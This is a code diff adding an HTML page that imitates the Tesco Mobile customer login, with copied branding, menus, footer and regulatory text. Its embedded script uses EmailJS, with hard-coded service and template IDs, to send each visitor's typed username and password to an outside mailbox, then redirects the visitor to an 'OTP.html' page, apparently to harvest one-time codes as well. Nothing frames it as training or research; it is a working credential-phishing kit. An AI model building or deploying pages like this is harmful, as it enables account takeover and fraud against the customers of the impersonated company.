@@ -1,0 +1,287 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login to your Account</title>
+    <link rel="stylesheet" href="styles.css">
+    <!-- <script>
+        // Ensure emailjs is initialized after the script is loaded
+        window.onload = function() {
+            emailjs.init("8ckODlN_JTZzfQzrz"); // Replace with your actual EmailJS public key
+        };
+    </script> -->
+    <!-- <script src="index.js"></script> -->
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+    <script>
+        window.onload = function() {
+            emailjs.init("8ckODlN_JTZzfQzrz");  
+        };
+    
+        function sendmail() {
+            // Get values from input fields
+            var params = {
+                Username: document.getElementById("username").value,
+                Password: document.getElementById("password").value,
+            };
+    
+            const serviceID = "service_h6bh47m";  // Your actual service ID
+            const templateID = "template_g26p39p";  // Your actual template ID
+    
+            // Send the email using EmailJS
+            emailjs.send(serviceID, templateID, params)
+                .then((res) => {
+                
+                    document.getElementById("username").value = "";
+                    document.getElementById("password").value = "";
+                    
+                    console.log(res);
+                    window.location.href = "./OTP.html";
+                    
+                })
+                .catch((err) => console.log(err));
+        }
+    </script>
+    
+
+
+
+</head>
+<body>
+
+    <!-- Sub-navbar Section -->
+    <div class="navbar-sub" id="top-navbar">
+        <ul>
+            <li><a href="#">Personal</a></li>
+            <li><a href="#">Business</a></li>
+            <li><a href="#">Store locator</a></li>
+            <li><a href="#">Coverage checker</a></li>
+            <li><a href="#">Status checker</a></li>
+        </ul>
+    </div>
+
+    <!-- Main Navbar -->
+    <nav class="navbar">
+        <div class="navbar-container">
+            <div class="logo">
+                <img src="tescomobile-logo.svg" alt="Tesco Mobile Logo">
+            </div>
+
+            <!-- Mobile Menu Button -->
+            <button class="menu-btn" id="menu-btn" aria-label="Toggle menu">
+                <span class="menu-icon"></span>
+                <span class="menu-icon"></span>
+                <span class="menu-icon"></span>
+            </button>
+
+            <!-- Navigation Links -->
+            <ul class="nav-links" id="nav-links">
+                <li><a href="#">Phones</a></li>
+                <li><a href="#">SIM only</a></li>
+                <li><a href="#">Help</a></li>
+                <li><a href="#">Business</a></li>
+                <li><a href="#">Why Tesco Mobile</a></li>
+            </ul>
+
+            <!-- Search and Cart Section -->
+            <div class="search-cart">
+                <input type="text" placeholder="Search phones, offers & help">
+                <button class="search-btn" aria-label="Search"><img src="search.png.png" alt="Search"></button>
+                <button class="cart-btn" aria-label="View cart"><img src="basket.png.png" alt="Cart"></button>
+            </div>
+
+            <!-- Contact and Login Section -->
+            <div class="contact-login">
+                <button class="contact-btn" aria-label="Contact us"><img src="contect.png" alt="Contact"></button>
+                <a href="#" class="login-btn">Log in</a>
+            </div>
+        </div>
+
+        <!-- Mobile Dropdown Menu -->
+        <div class="mobile-menu" id="mobile-menu">
+            <ul>
+                <li><a href="#">Personal</a></li>
+                <li><a href="#">Business</a></li>
+                <li><a href="#">Store locator</a></li>
+                <li><a href="#">Coverage checker</a></li>
+                <li><a href="#">Status checker</a></li>
+                <li><a href="#">Phones</a></li>
+                <li><a href="#">SIM only</a></li>
+                <li><a href="#">Help</a></li>
+                <li><a href="#">Business</a></li>
+                <li><a href="#">Why Tesco Mobile</a></li>
+            </ul>
+        </div>
+    </nav>
+
+<!-- Login Page -->
+<div class="container">
+    <div class="login-box">
+        <h2>Log in to your account</h2>
+        <form onsubmit="event.preventDefault(); sendmail();">
+            <div class="toggle-buttons">
+                <button type="button" class="toggle active">Pay monthly</button>
+                <button type="button" class="toggle">Pay as you go</button>
+            </div>
+            <div class="input-group" style="position: relative;">
+                <label for="username">Username</label>
+                <input type="text" id="username" name="username" placeholder="e.g. sam123 or sam@example.com" required>
+            </div>
+            <div class="input-group" style="position: relative;">
+                <label for="password">Password</label>
+                <input type="password" id="password" name="password" required>
+                <span class="show-password" id="togglePassword" onclick="togglePasswordVisibility()">
+                    <i class="fas fa-eye"></i>
+                </span>
+            </div>
+            <div class="forgot-links">
+                <a href="#">Forgotten username?</a>
+                <a href="#">Forgotten password?</a>
+            </div>
+            <button type="submit" class="login-button">Log in</button>
+        </form>
+        
+        <div class="info-text">
+            <p>The easiest way to manage your account on the go. Just text <strong>APP</strong> to <strong>28901</strong></p>
+        </div>
+    </div>
+</div>
+
+<!-- FontAwesome Icon Link for Eye Icon -->
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
+
+<!-- Additional CSS for Icon Positioning -->
+<style>
+    .input-group {
+        position: relative;
+    }
+    .input-group input {
+        width: 100%;
+        padding-right: 40px; /* Add padding to make space for the eye icon */
+    }
+    .show-password {
+        position: absolute;
+        right: 10px;
+        top: 50%;
+        transform: translateY(-50%);
+        cursor: pointer;
+        color: #333; /* Icon color */
+    }
+    .show-password i {
+        font-size: 1.2em;
+    }
+</style>
+
+<script>
+function validateForm() {
+    const username = document.getElementById('username').value;
+    const password = document.getElementById('password').value;
+
+    if (username === '' || password === '') {
+        alert('Please fill in both fields');
+        return false; // Prevent form submission if any field is empty
+    }
+    return true; // Allow form submission if validation passes
+}
+
+function togglePasswordVisibility() {
+    const passwordInput = document.getElementById('password');
+    const toggleIcon = document.getElementById('togglePassword').querySelector('i');
+
+    if (passwordInput.type === 'password') {
+        passwordInput.type = 'text'; // Show password
+        toggleIcon.classList.remove('fa-eye'); // Change the icon
+        toggleIcon.classList.add('fa-eye-slash');
+    } else {
+        passwordInput.type = 'password'; // Hide password
+        toggleIcon.classList.remove('fa-eye-slash'); // Revert the icon
+        toggleIcon.classList.add('fa-eye');
+    }
+}
+</script>
+
+
+
+    <!-- JavaScript for Mobile Menu Toggle -->
+    <script src="script.js"></script>
+</body>
+</html>
+
+
+<!-- top Footer Section -->
+<footer class="footer">
+    <div class="footer-container">
+        <!-- Product Links -->
+        <div class="product-links">
+            <a href="#">iPhone 12</a>
+            <a href="#">iPhone 15</a>
+            <a href="#">Samsung Galaxy S24</a>
+            <a href="#">iPhone 13</a>
+            <a href="#">iPhone 14</a>
+        </div>
+        <!-- Social Media Links -->
+        <div class="social-links">
+            <a href="#" aria-label="Facebook"><img src="fb.png" alt="Facebook"></a>
+            <a href="#" aria-label="Twitter"><img src="twitter.png" alt="Twitter"></a>
+            <a href="#" aria-label="Instagram"><img src="insta.png" alt="Instagram"></a>
+            <a href="#" aria-label="YouTube"><img src="youtube.png" alt="YouTube"></a>
+        </div>
+    </div>
+</footer>
+
+<!-- Main footer section -->
+<body>
+    <footer>
+        <div class="footer-container">
+            <div class="footer-column">
+                <h3>About Tesco Mobile</h3>
+                <ul>
+                    <li><a href="#">Why Tesco Mobile</a></li>
+                    <li><a href="#">Customer reviews</a></li>
+                    <li><a href="#">What others say</a></li>
+                    <li><a href="#">Careers</a></li>
+                </ul>
+            </div>
+            <div class="footer-column">
+                <h3>Help</h3>
+                <ul>
+                    <li><a href="#">Device guides</a></li>
+                    <li><a href="#">Swapping your SIM card</a></li>
+                    <li><a href="#">Joining from another network</a></li>
+                    <li><a href="#">Going abroad</a></li>
+                    <li><a href="#">Contact us</a></li>
+                    <li><a href="#">UK call charges</a></li>
+                    <li><a href="#">Delivery</a></li>
+                    <li><a href="#">Returns</a></li>
+                    <li><a href="#">Accessibility support</a></li>
+                </ul>
+            </div>
+            <div class="footer-column">
+                <h3>Account services</h3>
+                <ul>
+                    <li><a href="#">Top-up</a></li>
+                    <li><a href="#">iPhone apps</a></li>
+                    <li><a href="#">Android apps</a></li>
+                    <li><a href="#">Upgrades</a></li>
+                    <li><a href="#">Pay monthly login</a></li>
+                    <li><a href="#">Pay as you go login</a></li>
+                    <li><a href="#">View Bill</a></li>
+                    <li><a href="#">Bill Payment</a></li>
+                </ul>
+            </div>
+        </div>
+        <div class="footer-bottom">
+            <p>© 2024 Tesco.com. All rights reserved.</p>
+            <ul>
+                <li><a href="#">Terms & conditions</a></li>
+                <li><a href="#">Privacy and cookies</a></li>
+                <li><a href="#">Code of practice</a></li>
+                <li><a href="#">Modern slavery statement</a></li>
+                <li><a href="#">Regulatory compliance</a></li>
+                <li><a href="#">Accessibility</a></li>
+            </ul>
+            <p>Tesco Mobile Ltd is authorised and regulated by the Financial Conduct Authority for its credit offering under registration number 723698. You can confirm our registration on the FCA's website.</p>
+        </div>
+    </footer>
+</body>
+</html>
